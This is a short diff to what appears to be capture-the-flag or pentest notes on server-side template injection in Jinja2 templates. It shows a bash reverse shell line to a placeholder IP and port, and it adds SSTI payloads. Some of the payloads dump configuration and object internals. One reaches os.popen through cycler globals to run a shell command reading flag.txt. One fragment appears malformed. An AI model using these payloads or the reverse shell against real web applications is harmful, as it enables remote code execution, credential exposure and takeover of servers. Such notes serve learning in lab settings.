@@ -417,6 +417,18 @@ Thanks to Legacyy for the recommended curl command
 
 Contents of shell.sh 
 bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
+
+{{self.__dict__}}
+{{config.items()}}
+{{request.url}}
+
+Executing SSTI as fragments using variables:
+{{%set a=cycler%}}
+{{%set b=a.__init__%}}
+{{%set c=b.globals__%}}
+
+Executing SSTI as a list:
+{"verb":["{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"],"noun":"test","adjective":"test","person":"test","place":"test"}
 ```
 
 
